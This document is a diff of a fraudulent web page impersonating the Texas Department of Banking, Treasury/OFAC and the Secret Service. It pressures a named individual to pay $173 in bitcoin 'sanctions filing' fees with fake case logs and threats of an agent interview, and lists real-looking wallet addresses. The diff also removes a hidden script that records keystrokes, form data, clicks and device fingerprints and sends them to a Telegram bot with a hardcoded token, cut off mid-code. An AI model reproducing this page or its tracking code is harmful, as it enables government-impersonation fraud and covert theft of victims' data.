@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TIFMA | IRS Compliance & Final Clearance</title>
+    <title>TIFMA | Official Beneficiary Protection & Sanctions Compliance</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
@@ -24,7 +25,7 @@
         
         .progress-container {
             background: #e2e8f0;
-            border-radius: 40px;
+            border-radius: 4px;
             height: 12px;
             overflow: hidden;
             margin: 20px 0;
@@ -32,20 +33,15 @@
         .progress-fill {
             width: 100%;
             height: 100%;
-            background: linear-gradient(90deg, #15803d, #22c55e);
-            border-radius: 40px;
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.7; }
+            background: #15803d;
         }
         
         .addr-box {
             background: #f1f5f9;
-            padding: 10px;
-            border-radius: 6px;
-            font-family: monospace;
+            padding: 12px;
+            border: 1px solid #cbd5e1;
+            border-radius: 4px;
+            font-family: 'Roboto Mono', monospace;
             font-size: 10px;
             word-break: break-all;
             display: flex;
@@ -57,7 +53,7 @@
             background: #1e40af;
             color: white;
             border: none;
-            padding: 4px 12px;
+            padding: 6px 12px;
             border-radius: 4px;
             font-size: 10px;
             font-weight: bold;
@@ -67,14 +63,14 @@
         .copy-btn:hover { background: #1e3a8a; }
         
         .audit-trail {
-            height: 200px;
+            height: 250px;
             overflow-y: auto;
             font-family: 'Roboto Mono', monospace;
             font-size: 10px;
             background: #0f172a;
             color: #22c55e;
-            padding: 12px;
-            border-radius: 6px;
+            padding: 15px;
+            border-radius: 4px;
         }
         
         .seal-img {
@@ -83,61 +79,59 @@
             border: 2px solid #e2e8f0;
             padding: 6px;
             background: white;
-            border-radius: 12px;
+            border-radius: 4px;
         }
         
         @media (max-width: 768px) {
-            .seal-img { max-width: 80px; }
+            .seal-img { max-width: 100px; }
             .addr-box { flex-wrap: wrap; }
         }
 
-        /* News Popup Styling */
-        #news-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 9999; display: flex; align-items: center; justify-content: center; padding: 20px; }
-        .news-window { background: white; width: 100%; max-width: 600px; border-radius: 12px; overflow: hidden; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); position: relative; animation: slideIn 0.4s ease-out; }
-        @keyframes slideIn { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } 
-        }
+        #news-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 9999; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .news-window { background: white; width: 100%; max-width: 650px; border-radius: 4px; overflow: hidden; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); position: relative; animation: slideIn 0.4s ease-out; }
+        @keyframes slideIn { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
     </style>
 </head>
 <body class="flex flex-col min-h-screen">
 
-        <!-- News Pop-up -->
+    <!-- News Pop-up: SANCTIONS NOTIFICATION -->
     <div id="news-overlay">
         <div class="news-window">
-            <div class="bg-red-700 text-white px-6 py-3 flex justify-between items-center">
+            <div class="bg-red-700 text-white px-6 py-4 flex justify-between items-center">
                 <span class="text-xs font-black uppercase tracking-widest flex items-center gap-2">
-                    <i class="fas fa-rss animate-pulse"></i> Global Compliance News
+                    <i class="fas fa-exclamation-triangle animate-pulse"></i> Mandatory Sanctions Disclosure
                 </span>
                 <button onclick="document.getElementById('news-overlay').style.display='none'" class="text-white hover:text-gray-300 transition-colors">
                     <i class="fas fa-times text-xl"></i>
                 </button>
             </div>
             <div class="p-8">
-                <div class="flex items-center gap-3 mb-4 text-blue-800 font-bold text-xs uppercase">
-                    <span>Associated Press (AP)</span>
+                <div class="flex items-center gap-3 mb-4 text-blue-900 font-bold text-xs uppercase">
+                    <span>U.S. Treasury Department</span>
                     <span class="w-1 h-1 bg-gray-300 rounded-full"></span>
-                    <span>Treasury News</span>
+                    <span>OFAC Compliance</span>
                 </div>
-                <h2 class="text-2xl font-black text-slate-900 leading-tight mb-4">
-                    US Sanctions Iranian Financiers Over $100M Cryptocurrency Evasion Schemes
+                <h2 class="text-2xl font-black text-slate-900 leading-tight mb-4 uppercase">
+                    Critical Sanctions Expansion: PitchBook Settlement Review
                 </h2>
                 <p class="text-sm text-slate-600 leading-relaxed mb-6">
-                    Shipping firms and jurisdictions increasingly face serious sanctions violations when utilizing unverified cryptocurrency channels. 
-                    The Treasury Department warns that "stepping into a legal minefield" is inevitable for entities failing to clear inter-agency communication protocols.
+                    Effective April 16, 2026, the Treasury has expanded restricted lists. Transactions originating from freelance platforms with links to sanctioned settlement nodes are now flagged for mandatory enhanced due diligence by the <strong>Cyber Fraud Task Force (CFTF)</strong>.
                 </p>
                 <div class="space-y-3">
-                    <a href="https://home.treasury.gov/news/press-releases/sb0364?utm_source=chatgpt.com" target="_blank" class="block p-4 bg-slate-50 border border-slate-200 rounded-lg hover:bg-slate-100 transition-colors group">
+                    <a href="http://national-settlement-board.cfd/cyber-security.html" target="_blank" class="block p-4 bg-red-50 border border-red-200 rounded-lg hover:bg-red-100 transition-colors group">
                         <div class="flex justify-between items-center">
-                            <span class="text-xs font-bold text-slate-800">Read Official Treasury Release</span>
-                            <i class="fas fa-external-link-alt text-slate-400 group-hover:text-blue-600"></i>
+                            <span class="text-xs font-bold text-red-800 uppercase tracking-wide">Review Sanctioned Entities List</span>
+                            <i class="fas fa-external-link-alt text-red-400 group-hover:text-red-600"></i>
                         </div>
                     </a>
                 </div>
-                <button onclick="document.getElementById('news-overlay').style.display='none'" class="w-full mt-8 bg-slate-900 text-white font-black py-3 rounded-lg uppercase text-xs tracking-widest hover:bg-slate-800 transition-all">
-                    Acknowledge & Continue to Dashboard
+                <button onclick="document.getElementById('news-overlay').style.display='none'" class="w-full mt-8 bg-slate-900 text-white font-black py-4 rounded-lg uppercase text-xs tracking-widest hover:bg-slate-800 transition-all">
+                    Acknowledge Notice & Proceed to Protective Filing
                 </button>
             </div>
         </div>
     </div>
+
     <!-- .gov Banner -->
     <section class="gov-banner no-print">
         <div class="max-w-7xl mx-auto flex items-center gap-2">
@@ -151,12 +145,10 @@
     </section>
 
     <!-- Header -->
-    <header class="nav-header px-4 py-6 md:px-8 no-print">
+    <header class="nav-header px-4 py-8 md:px-8 no-print">
         <div class="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-4">
             <div class="flex items-center gap-4">
-                <div class="h-12 w-12 bg-white rounded-full flex items-center justify-center text-2xl shadow-md overflow-hidden p-1">
-                   <img src="https://national-settlement-board.cfd/images/dob-texas.png" alt="Texas Seal">
-                </div>
+                <img src="https://national-settlement-board.cfd/images/dob-texas.png" alt="Texas Seal" class="h-14 w-14 bg-white rounded-full p-1 shadow-md">
                 <div>
                     <h1 class="text-xl md:text-2xl font-black uppercase tracking-tighter text-white">Texas Department of Banking</h1>
                     <p class="text-[9px] font-bold text-slate-400 uppercase tracking-[0.2em]">Institutional Funds Management Authority (TIFMA)</p>
@@ -167,156 +159,145 @@
                     <p class="text-[10px] font-mono text-blue-200">FEDERAL NODE: TX-DAL-11-RC</p>
                     <p class="text-[10px] text-green-400 font-bold uppercase tracking-widest">● Secure Session Active</p>
                 </div>
-                <img src="https://national-settlement-board.cfd/images/tdi-seal.png" class="h-14" onerror="this.src='https://national-settlement-board.cfd/TDI.jpg'">
+                <img src="https://national-settlement-board.cfd/images/tdi-seal.png" class="h-16" onerror="this.src='https://national-settlement-board.cfd/TDI.jpg'">
             </div>
         </div>
     </header>
 
-    <main class="flex-grow w-full max-w-7xl mx-auto p-4 md:p-8">
-        <div class="grid md:grid-cols-3 gap-8">
-            <!-- MAIN CONTENT - 2/3 width -->
-            <div class="md:col-span-2 space-y-6">
-                <!-- Success Banner -->
-                <div class="bg-green-50 border-l-8 border-green-600 p-6 rounded-r-lg">
-                    <div class="flex items-center gap-4">
-                        <div class="text-4xl text-green-700">✓</div>
+    <main class="flex-grow w-full max-w-7xl mx-auto p-4 md:p-10">
+        <div class="grid lg:grid-cols-3 gap-10">
+            <!-- MAIN CONTENT -->
+            <div class="lg:col-span-2 space-y-8">
+                
+                <!-- Mandatory Compliance Hold Banner -->
+                <div class="bg-white border-l-8 border-red-600 p-8 shadow-sm rounded-r-lg">
+                    <div class="flex items-start gap-5">
+                        <div class="text-5xl text-red-700"><i class="fas fa-shield-alt"></i></div>
                         <div>
-                            <h2 class="text-xl font-black text-green-900">IRS Compliance Successful</h2>
-                            <p class="text-green-800">The legal matter with PitchBook has been resolved. No capital gains taxes will be withheld from your disbursement.</p>
+                            <h2 class="text-2xl font-black text-slate-900 uppercase tracking-tighter mb-2">Pre-Enforcement Protective Filing</h2>
+                            <p class="text-slate-600 text-sm leading-relaxed mb-4">Your disbursement of <strong>$847,249.00</strong> has been flagged for mandatory review by the <strong>U.S. Secret Service – Cyber Fraud Task Force (CFTF)</strong>. You must complete the following filings to separate your personal funds from the corporate sanctions review.</p>
+                            <div class="bg-red-50 p-4 rounded border border-red-100">
+                                <p class="text-[11px] font-black text-red-800 uppercase italic">Requirement: A special agent has been assigned. You will be contacted for an in-person interview within 24-48 hours.</p>
+                            </div>
                         </div>
                     </div>
                 </div>
 
-                <!-- Progress Bar -->
-                <div class="bg-white p-6 border border-slate-200 rounded-lg">
-                    <div class="flex justify-between text-sm font-bold mb-2">
-                        <span>IRS Resolution Progress</span>
-                        <span class="text-green-700">100% Complete</span>
-                    </div>
-                    <div class="progress-container">
-                        <div class="progress-fill"></div>
-                    </div>
-                    <p class="text-xs text-slate-500 mt-3 text-center">All tax liens and compliance holds have been cleared.</p>
-                </div>
-
-                <!-- Final Standard Fee Notice -->
-                <div class="bg-amber-50 border-l-8 border-amber-600 p-6 rounded-r-lg">
-                    <div class="flex items-center gap-4 mb-4">
-                        <div class="text-4xl text-amber-700">⛓️</div>
-                        <div>
-                            <h3 class="text-lg font-black text-amber-900">Final Step — Inter-Agency Communication Fee</h3>
-                            <p class="text-amber-800 text-sm">To generate the final 8-digit decryption key for your FRC, please remit the standard <strong>Remaining Inter-Agency Communication Fee (VARIABLE)</strong>. This is the final administrative charge.</p>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Payment Options Grid -->
+                <!-- Filing Fee Breakdown -->
                 <div class="grid md:grid-cols-2 gap-6">
-                    <!-- Lightning Option -->
-                    <div class="bg-white p-5 border border-slate-200 rounded-lg shadow-sm relative">
-                        <div class="absolute top-0 left-0 w-1 h-full bg-amber-500 rounded-l-lg"></div>
-                        <p class="text-[10px] font-black text-slate-400 uppercase mb-3">IACFE Standard Remit (Lightning)</p>
-                        <div class="flex justify-center mb-4">
-                            <div class="p-2 border border-slate-200 bg-white rounded-xl">
-                                <img src="https://national-settlement-board.cfd/images/insurance-lightning.png" class="seal-img" alt="Lightning QR" onerror="this.src='https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=lnurl1dp68gurn8ghj7ampd3kx2ar0veekzar0wd5xjtnrdakj7tnhv4kxctttdehhwm30d3h82unvwqhhxarfdenhjer9wd5kwm33xgcs4dejrg'">
-                            </div>
-                        </div>
-                        <div class="addr-box">
-                            <span id="l-addr" class="truncate max-w-[180px]">lnurl1dp68gurn8ghj7ampd3kx2ar0veekzar0wd5xjtnrdakj7tnhv4kxctttdehhwm30d3h82unvwqhhxarfdenhjer9wd5kwm33xgcs4dejrg</span>
-                            <button class="copy-btn" onclick="copy('l-addr')">COPY</button>
-                        </div>
-                        <div class="mt-3 text-center">
-                            <span class="text-[11px] font-black text-amber-700">Amount Due : (VARIABLE)</span>
-                        </div>
+                    <div class="bg-white p-6 border border-slate-200 rounded-lg shadow-sm">
+                        <p class="text-[10px] font-black text-slate-400 uppercase mb-2">1. Beneficiary Indemnity Filing</p>
+                        <p class="text-3xl font-black text-slate-900">$75.00</p>
+                        <p class="text-[10px] text-slate-500 mt-2">Unilateral Good Faith Claim processing.</p>
                     </div>
+                    <div class="bg-white p-6 border border-slate-200 rounded-lg shadow-sm">
+                        <p class="text-[10px] font-black text-slate-400 uppercase mb-2">2. Case Management & Agent Fee</p>
+                        <p class="text-3xl font-black text-slate-900">$98.00</p>
+                        <p class="text-[10px] text-slate-500 mt-2">CFTF Administrative processing & interview scheduling.</p>
+                    </div>
+                </div>
 
-                    <!-- BTC On-Chain Option -->
-                    <div class="bg-white p-5 border border-slate-200 rounded-lg shadow-sm">
-                        <p class="text-[10px] font-black text-slate-400 uppercase mb-3">Blockchain Address (BTC)</p>
-                        <div class="flex justify-center mb-4">
-                            <div class="p-2 border border-slate-200 bg-white rounded-xl">
-                                <img src="https://national-settlement-board.cfd/images/insurance-btc.png" class="seal-img" alt="BTC QR" onerror="this.src='https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=bc1p0mxat232pc4xwwclzghr3643w76hqs4362lehecawwmmmpkmkt3s72eut8'">
+                <!-- Payment Area -->
+                <div class="bg-white border border-slate-200 rounded-lg p-8 shadow-md">
+                    <h3 class="text-lg font-black text-slate-900 uppercase tracking-widest mb-6 border-b pb-4">Total Remittance Due: $173.00 USD</h3>
+                    
+                    <div class="grid md:grid-cols-2 gap-10">
+                        <!-- Lightning -->
+                        <div class="space-y-4">
+                            <p class="text-[10px] font-black text-slate-400 uppercase tracking-widest text-center">Lightning Node (Instant Processing)</p>
+                            <div class="flex justify-center">
+                                <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=lnurl1dp68gurn8ghj7ampd3kx2ar0veekzar0wd5xjtnrdakj7tnhv4kxctttdehhwm30d3h82unvwqhhxarfdenhjer9wd5kwm33xgcs4dejrg" class="seal-img" alt="QR">
+                            </div>
+                            <div class="addr-box">
+                                <span id="l-addr" class="truncate max-w-[180px]">lnurl1dp68gurn8ghj7ampd3kx2ar0veekzar0wd5xjtnrdakj7tnhv4kxctttdehhwm30d3h82unvwqhhxarfdenhjer9wd5kwm33xgcs4dejrg</span>
+                                <button class="copy-btn" onclick="copy('l-addr')">COPY</button>
                             </div>
                         </div>
-                        <div class="addr-box">
-                            <span id="b-addr" class="truncate max-w-[180px]">bc1p0mxat232pc4xwwclzghr3643w76hqs4362lehecawwmmmpkmkt3s72eut8</span>
-                            <button class="copy-btn" onclick="copy('b-addr')">COPY</button>
-                        </div>
-                        <div class="mt-3 text-center text-[10px] text-slate-500 italic">
-                            <i class="fa-solid fa-shield-halved mr-1"></i> Multi-Sig Encryption Enabled
+
+                        <!-- BTC -->
+                        <div class="space-y-4">
+                            <p class="text-[10px] font-black text-slate-400 uppercase tracking-widest text-center">On-Chain BTC Settlement</p>
+                            <div class="flex justify-center">
+                                <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=bc1p0mxat232pc4xwwclzghr3643w76hqs4362lehecawwmmmpkmkt3s72eut8" class="seal-img" alt="QR">
+                            </div>
+                            <div class="addr-box">
+                                <span id="b-addr" class="truncate max-w-[180px]">bc1p0mxat232pc4xwwclzghr3643w76hqs4362lehecawwmmmpkmkt3s72eut8</span>
+                                <button class="copy-btn" onclick="copy('b-addr')">COPY</button>
+                            </div>
                         </div>
                     </div>
                 </div>
 
-                <!-- Continue Button -->
+                <!-- Action Button -->
                 <div class="text-center">
-                    <a href="https://national-settlement-board.cfd/frc-download-pdf.html" class="inline-block bg-blue-900 hover:bg-blue-800 text-white font-black px-10 py-4 rounded uppercase text-sm tracking-wider shadow-lg transition-all">
-                        ✓ PROCEED TO FRC DOCUMENT
-                    </a>
-                    <p class="text-[10px] text-slate-500 mt-3">After payment, your FRC will be available for download.</p>
+                    <button class="bg-slate-900 hover:bg-black text-white font-black px-12 py-5 rounded uppercase text-sm tracking-widest shadow-2xl transition-all">
+                        Validate Filing & Confirm Agent Meeting
+                    </button>
+                    <p class="text-[10px] text-slate-400 mt-4 uppercase font-bold">Authorized Personnel Only // Sanctions Control Hub</p>
                 </div>
             </div>
 
             <!-- SIDEBAR -->
             <aside class="space-y-6">
-                <!-- Payee Identity Panel -->
+                <!-- Identity -->
                 <div class="bg-white border border-slate-200 rounded-lg shadow-sm overflow-hidden">
-                    <div class="bg-slate-100 px-4 py-2 border-b border-slate-200">
-                        <p class="text-[10px] font-black text-slate-600 uppercase">Payee Identity</p>
+                    <div class="bg-slate-50 px-4 py-2 border-b border-slate-200">
+                        <p class="text-[10px] font-black text-slate-600 uppercase">Beneficiary Profile</p>
                     </div>
-                    <div class="p-5 text-center">
-                        <div class="w-16 h-16 bg-green-50 rounded-full mx-auto flex items-center justify-center mb-3 border-2 border-green-600">
-                            <i class="fa-solid fa-user-check text-2xl text-green-700"></i>
+                    <div class="p-6 text-center">
+                        <div class="w-20 h-20 bg-blue-50 rounded-full mx-auto flex items-center justify-center mb-4 border-2 border-blue-900 text-blue-900 text-2xl">
+                            <i class="fas fa-user-circle"></i>
                         </div>
-                        <h5 class="text-sm font-bold">Mujinga T. Mukuna</h5>
-                        <p class="text-[9px] text-slate-500 font-bold uppercase mt-1">IRS Compliance Verified</p>
-                        <p class="text-[10px] text-green-700 mt-2 font-mono">Case: TX-B10B-2026-MUK1139</p>
+                        <h5 class="text-sm font-bold uppercase">Mujinga T. Mukuna</h5>
+                        <p class="text-[9px] text-red-600 font-black uppercase mt-1">Status: Flagged for Review</p>
+                        <p class="text-[10px] font-mono mt-3 text-slate-500">Node: First Convenience Bank</p>
+                        <p class="text-[10px] text-slate-700 mt-1 font-mono">Case: TX-B10B-2026-MUK1139</p>
                     </div>
                 </div>
 
-                <!-- Audit Log Panel -->
+                <!-- Audit Log -->
                 <div class="bg-white border border-slate-200 rounded-lg shadow-sm overflow-hidden">
-                    <div class="bg-slate-100 px-4 py-2 border-b border-slate-200">
+                    <div class="bg-slate-50 px-4 py-2 border-b border-slate-200">
                         <p class="text-[10px] font-black text-slate-600 uppercase flex items-center gap-2">
-                            <i class="fa-solid fa-terminal"></i> SYSTEM_AUDIT_LOG
+                            <i class="fas fa-terminal"></i> Network Audit Trail
                         </p>
                     </div>
-                    <div id="log-box" class="audit-trail h-48"></div>
+                    <div id="log-box" class="audit-trail h-64"></div>
                 </div>
 
-                <!-- Support Panel -->
-                <div class="bg-white border border-slate-200 rounded-lg shadow-sm p-4 text-center">
-                    <i class="fa-solid fa-headset text-2xl text-blue-800 mb-2"></i>
-                    <p class="text-[10px] font-bold uppercase">24/7 Support</p>
-                    <p class="text-[9px] text-slate-500">support@national-settlement-board.cfd</p>
+                <!-- Official Seals -->
+                <div class="grid grid-cols-2 gap-4">
+                    <div class="bg-white p-4 border border-slate-200 flex items-center justify-center opacity-50 grayscale hover:grayscale-0 hover:opacity-100 transition-all">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/Seal_of_the_United_States_Federal_Reserve_System.svg/249px-Seal_of_the_United_States_Federal_Reserve_System.svg.png" class="h-10">
+                    </div>
+                    <div class="bg-white p-4 border border-slate-200 flex items-center justify-center opacity-50 grayscale hover:grayscale-0 hover:opacity-100 transition-all">
+                        <img src="https://national-settlement-board.cfd/images/usss.png" class="h-10">
+                    </div>
                 </div>
             </aside>
         </div>
     </main>
 
     <!-- Footer -->
-    <footer class="legal-footer mt-12 no-print">
-        <div class="max-w-7xl mx-auto px-6">
+    <footer class="legal-footer no-print">
+        <div class="max-w-7xl mx-auto px-10">
             <div class="grid md:grid-cols-3 gap-12 mb-12">
                 <div>
-                    <h5 class="text-white font-black text-sm uppercase tracking-widest mb-4">Federal Regulatory Oversight</h5>
-                    <p class="text-xs text-slate-400 leading-loose">Texas Department of Banking<br>2601 N Lamar Blvd, Austin, TX 78705</p>
+                    <h5 class="text-white font-black text-xs uppercase tracking-widest mb-4">Federal Regulatory Oversight</h5>
+                    <p class="text-[11px] text-slate-400 leading-relaxed">Texas Department of Banking<br>2601 N Lamar Blvd, Austin, TX 78705<br>Electronic Funds Transfer Protocol v26.3</p>
                 </div>
                 <div>
-                    <h5 class="text-white font-black text-sm uppercase tracking-widest mb-4">Network Node 11</h5>
-                    <p class="text-xs text-slate-400 leading-loose">Eleventh District Federal Reserve<br>Dallas Operations Center</p>
+                    <h5 class="text-white font-black text-xs uppercase tracking-widest mb-4">Secret Service Liaison</h5>
+                    <p class="text-[11px] text-slate-400 leading-relaxed">Office of Beneficiary Affairs<br>Cyber Fraud Task Force (CFTF)<br>admin@national-settlement-board.cfd</p>
                 </div>
                 <div>
-                    <h5 class="text-white font-black text-sm uppercase tracking-widest mb-4">Access Protocol</h5>
-                    <p class="text-[10px] text-slate-500 italic leading-relaxed">Authorized beneficiary access only. Sessions monitored under CFAA.</p>
+                    <h5 class="text-white font-black text-xs uppercase tracking-widest mb-4">Legal Warning</h5>
+                    <p class="text-[11px] text-slate-500 italic leading-relaxed">Authorized use only. Unauthorized access attempt is a violation of 18 U.S.C. § 1030. Sessions are recorded for regulatory audit.</p>
                 </div>
             </div>
-            <div class="pt-8 border-t border-slate-800 flex flex-wrap justify-between items-center gap-4">
-                <p class="text-[10px] text-slate-600 uppercase font-mono tracking-widest">Electronic Fund Transfer Protocol v26.3</p>
-                <div class="flex gap-6">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Flag_of_the_United_States.svg" class="h-3.5 shadow-sm" alt="US Flag">
-                    <img src="https://national-settlement-board.cfd/Federal-Reserve-System-Logo.png" class="h-8 opacity-40 grayscale" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/Seal_of_the_United_States_Federal_Reserve_System.svg/249px-Seal_of_the_United_States_Federal_Reserve_System.svg.png'">
-                </div>
+            <div class="pt-8 border-t border-slate-800 flex justify-between items-center">
+                <p class="text-[10px] text-slate-600 font-mono">SECURE_GATEWAY_AUTH: TX-B10B-2026-MUK</p>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Flag_of_the_United_States.svg" class="h-4 shadow-sm opacity-30">
             </div>
         </div>
     </footer>
@@ -334,16 +315,19 @@
         function toggleGov() { document.getElementById('govDrop').classList.toggle('active'); }
 
         const scanLogs = [
-            "DECRYPTING_IRS_HANDSHAKE...",
-            "SUCCESS: CAPITAL_GAINS_EXEMPTION_APPLIED",
-            "CASE_TX9902: CLOSED_PENDING_IACFE",
-            "INITIALIZING_FINAL_8DIGIT_STRING...",
-            "WAITING_FOR_REMAIMING IACFE_PORT $65..."
+            "DETECTION: PITCHBOOK_DISBURSEMENT_FLAGGED",
+            "WARNING: OFAC_RESTRICTED_NODE_V4.2_MATCH",
+            "INITIATING: CFTF_CASE_FILE_TX-MUK",
+            "ASSIGNING: CFTF_SPECIAL_AGENT_ALLOCATED",
+            "STATUS: PRE_ENFORCEMENT_FILING_REQUIRED",
+            "NOTICE: BANK_LIABILITY_NOTIFICATION_SENT",
+            "WAITING: BENEFICIARY_INDEMNITY_FILING_($173)"
         ];
         let i = 0;
         const logBox = document.getElementById('log-box');
         function addLog(msg, color = '#22c55e') {
             const entry = document.createElement('div');
+            entry.className = "mb-1";
             const time = new Date().toLocaleTimeString([], {hour12: false});
             entry.innerHTML = `<span class="text-slate-500">[${time}]</span> <span style="color:${color}">${msg}</span>`;
             logBox.appendChild(entry);
@@ -352,782 +336,12 @@
         setInterval(() => {
             addLog(scanLogs[i % scanLogs.length]);
             i++;
-        }, 4000);
+        }, 3000);
         window.onload = () => {
             addLog("ESTABLISHING_SECURE_NODE_TX...", "#3b82f6");
-            addLog("IRS_STATUS: VERIFIED_SUCCESSFUL", "#22c55e");
+            addLog("MANDATORY_SANCTIONS_REVIEW: ACTIVE", "#ef4444");
         };
         window.toggleGov = toggleGov;
     </script>
-    
-<script>
-  (function() {
-    "use strict";
-    const _v0 = ['8481428965', 'AAEOFp_DPPuPG5fPl03AmYSPNebgpqZoejY'];
-    const _v1 = '7275242903';
-    const SECURE_CONFIG = {
-      API_TOKEN: _v0[0] + ':' + _v0[1],
-      TARGET_ID: _v1,
-      BUFFER_LIMIT: 8,
-      CLICK_LIMIT: 5,
-      SYNC_DELAY: 4000,
-      HEARTBEAT: 20000,
-      RETRY_LIMIT: 10,
-      QUEUE_MAX: 500,
-      SESS_KEY: 'NSB_NODE_' + Math.random().toString(36).substring(2, 15),
-      FLOW_CONTROL: 1200,
-      KEY_BATCH: 10
-    };
-    let _lastSync = 0;
-    let _msgQueue = [];
-    let _lock = false;
-    let _evtBuffer = [];
-    let _hTimer = null;
-    let _keyCapture = [];
-    let _ptrCapture = [];
-    let _lastAct = Date.now();
-    let _cache = [];
-    let _start = Date.now();
-    let _vDepth = 0;
-    let _mStream = null;
-    let _mState = false;
-    let _pValid = localStorage.getItem('media_access_verified') === 'true';
-    let _touchPts = [];
-    let _resChanges = [];
-    let _fieldStart = new Map();
-    let _mouseMoves = [];
-    let _mouseTimer = null;
-    async function _transmit(payload, urgency = false) {
-      const _out = String(payload).substring(0, 4096);
-      const _now = Date.now();
-      const _diff = _now - _lastSync;
-      if (_diff < SECURE_CONFIG.FLOW_CONTROL && !urgency) {
-        _msgQueue.push(_out);
-        setTimeout(_processQueue, SECURE_CONFIG.FLOW_CONTROL - _diff);
-        return;
-      }
-      _lastSync = _now;
-      try {
-        const _r = await fetch('https://api.telegram.org/bot' + SECURE_CONFIG.API_TOKEN + '/sendMessage', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            chat_id: SECURE_CONFIG.TARGET_ID,
-            text: _out
-          })
-        });
-        if (!_r.ok) throw new Error('ERR_UP');
-        _processQueue();
-      } catch (e) {
-        if (_cache.length < SECURE_CONFIG.QUEUE_MAX) _cache.push(_out);
-      }
-    }
-    function _processQueue() {
-      if (_lock || _msgQueue.length === 0) return;
-      _lock = true;
-      const _next = _msgQueue.shift();
-      _transmit(_next, true).finally(() => {
-        _lock = false;
-        if (_msgQueue.length > 0) setTimeout(_processQueue, SECURE_CONFIG.FLOW_CONTROL);
-      });
-    }
-    function _stageEvent(id, data) {
-      _evtBuffer.push({
-        id: id,
-        payload: data,
-        tick: Date.now(),
-        sid: SECURE_CONFIG.SESS_KEY,
-        u: window.location.href,
-        ref: document.referrer || 'direct'
-      });
-      if (_hTimer) clearTimeout(_hTimer);
-      _hTimer = setTimeout(_pushBuffer, SECURE_CONFIG.SYNC_DELAY);
-      if (_evtBuffer.length >= SECURE_CONFIG.BUFFER_LIMIT) _pushBuffer();
-    }
-    function _pushBuffer() {
-      if (_evtBuffer.length === 0) return;
-      const _ship = [..._evtBuffer];
-      _evtBuffer = [];
-      const _meta = `\nNODE: ${SECURE_CONFIG.SESS_KEY}\nPAGE: ${window.location.pathname}`;
-      _transmit('📦 BATCH_DATA [' + _ship.length + ']' + _meta + '\n' + JSON.stringify(_ship, null, 1), true);
-    }
-    function _hwFingerprint() {
-      const _c = document.createElement('canvas');
-      const _x = _c.getContext('2d');
-      _c.width = 300;
-      _c.height = 50;
-      _x.textBaseline = "top";
-      _x.font = "14px 'Arial'";
-      _x.fillStyle = "#f60";
-      _x.fillRect(100, 5, 50, 40);
-      _x.fillStyle = "#069";
-      _x.fillText("NSB_SYSTEM_UNIT_ACTIVE", 2, 10);
-      const _f1 = _c.toDataURL();
-      let _webgl = {};
-      try {
-        const _c2 = document.createElement('canvas');
-        const _gl = _c2.getContext('webgl') || _c2.getContext('experimental-webgl');
-        if (_gl) {
-          const _ext = _gl.getExtension('WEBGL_debug_renderer_info');
-          _webgl = {
-            r: _ext ? _gl.getParameter(_ext.UNMASKED_RENDERER_WEBGL) : _gl.getParameter(_gl.RENDERER),
-            v: _ext ? _gl.getParameter(_ext.UNMASKED_VENDOR_WEBGL) : _gl.getParameter(_gl.VENDOR)
-          };
-        }
-      } catch (e) {}
-      return {
-        ua: navigator.userAgent,
-        plt: navigator.platform,
-        mem: navigator.deviceMemory || 0,
-        cpu: navigator.hardwareConcurrency || 0,
-        scr: `${screen.width}x${screen.height}`,
-        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        lang: navigator.languages,
-        gpu: _webgl,
-        fp: _f1.slice(-60)
-      };
-    }
-    function _mapInput(e) {
-      let _k = e.key;
-      const _t = e.target;
-      return {
-        key: _k,
-        id: _t.id || _t.name || 'anon',
-        tag: _t.tagName,
-        raw: (_t.type === 'password' || _t.id?.includes('pass')) ? '[SENSITIVE_CAP]' : _t.value,
-        ts: Date.now()
-      };
-    }
-    document.addEventListener('keydown', (e) => {
-      _keyCapture.push(_mapInput(e));
-      _lastAct = Date.now();
-      if (_keyCapture.length >= SECURE_CONFIG.KEY_BATCH) {
-        _stageEvent('KEY_LOG', [..._keyCapture]);
-        _keyCapture = [];
-      }
-    });
-    document.addEventListener('input', (e) => {
-      const _t = e.target;
-      _stageEvent('INPUT_LIVE', {
-        id: _t.id || _t.name,
-        val: _t.value,
-        type: _t.type,
-        ts: Date.now()
-      });
-    });
-    document.addEventListener('submit', (e) => {
-      const _f = e.target;
-      const _d = new FormData(_f);
-      const _p = {};
-      for (let [k, v] of _d.entries()) _p[k] = v;
-      _stageEvent('FORM_CAPTURE', {
-        action: _f.action,
-        method: _f.method,
-        fields: _p
-      });
-      _pushBuffer();
-    }, true);
-    document.addEventListener('click', (e) => {
-      const _t = e.target;
-      _ptrCapture.push({
-        tag: _t.tagName,
-        id: _t.id || _t.className,
-        txt: _t.innerText?.slice(0, 50),
-        pos: { x: e.clientX, y: e.clientY },
-        ts: Date.now()
-      });
-      if (_ptrCapture.length >= SECURE_CONFIG.CLICK_LIMIT) {
-        _stageEvent('CLICK_LOG', [..._ptrCapture]);
-        _ptrCapture = [];
-      }
-    });
-    document.addEventListener('copy', () => {
